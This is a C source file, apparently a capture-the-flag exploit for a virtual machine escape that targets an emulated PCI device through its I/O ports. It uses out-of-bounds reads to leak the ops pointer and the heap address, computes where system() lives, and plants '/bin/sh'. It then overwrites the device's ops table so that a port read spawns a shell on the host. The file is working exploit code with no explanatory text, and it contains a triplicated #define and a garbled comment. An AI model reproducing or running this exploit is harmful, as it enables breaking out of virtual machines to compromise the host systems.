#include <sys/io.h>
#include <stdio.h>
#include <stdint.h>

#define PORT_BASE 0xc030     /* â† replace with lspci value */
#define REG_OFFSET_LO 0
#define REG_OFFSET_LO 0
#define REG_OFFSET_LO 0

static inline void out32(uint32_t val, uint16_t port) { outl(val, port); }
static inline uint32_t in32(uint16_t port)            { return inl(port); }

uint64_t read_64(uint64_t offset) {
    uint32_t offset1 = offset & 0xFFFFFFFF ;
    uint32_t offset2 = offset >> 32 ;
    out32(offset1, PORT_BASE);
    out32(offset2, PORT_BASE+4);
    uint64_t leak1 = in32(PORT_BASE+8) & 0xFFFFFFFF;
    // printf("leak1 %p\n", leak1);
    out32(offset1+4, PORT_BASE);
    uint64_t leak2 = (uint64_t)(((in32(PORT_BASE+8) & 0xFFFFFFFF)))<<32 ;
    // printf("leak2 %p\n", leak2);
    return leak1 + leak2 ;
}

void write_64(uint64_t offset, uint64_t val) {
    uint32_t offset1 = offset & 0xFFFFFFFF ;
    uint32_t offset2 = offset >> 32 ;
    uint32_t val1 = val & 0xFFFFFFFF ;
    uint32_t val2 = val >> 32 ;
    out32(offset1, PORT_BASE);
    out32(offset2, PORT_BASE+4);
    printf("val1 %p\n", val1);
    printf("val2 %p\n", val2);
    out32(val1, PORT_BASE+8);
    out32(offset1+4, PORT_BASE);
    out32(val2, PORT_BASE+8);
}

int main(void)
{
    if (ioperm(PORT_BASE, 16, 1)) {
        perror("ioperm"); return 1;
    }

    uint64_t val = read_64(-0xc4);
    printf("Read64 ops %p\n", val);
    
    uint64_t pie_base = val - ( 0x5555562738a0 - 0x0000555555554000 ); //pci_ops
    uint64_t system_plt = pie_base + ( 0x555555877370 - 0x0000555555554000 );
    uint64_t ops_write_plt = pie_base + ( 0x555555902c30 - 0x0000555555554000 );
    printf("Pie base address %p\n", pie_base);

    val = read_64(-0xbc);
    printf("Read64 opaque %p\n", val);

    uint64_t heap_buffer = val + 0xbd4;
    printf("Heap buffer address %p\n", heap_buffer);

    // uint64_t val = read_64(-0xbc);
    // printf("Read64 ops %p\n", val);
    write_64(0x0, system_plt);
    write_64(0x8, ops_write_plt);
    write_64(0x10, 0x68732f6e69622f);

    write_64(-0xc4, heap_buffer);

    puts("Trigger ops");
    write_64(-0xbc, heap_buffer+0x10);

    in32(PORT_BASE);

    return 0;
}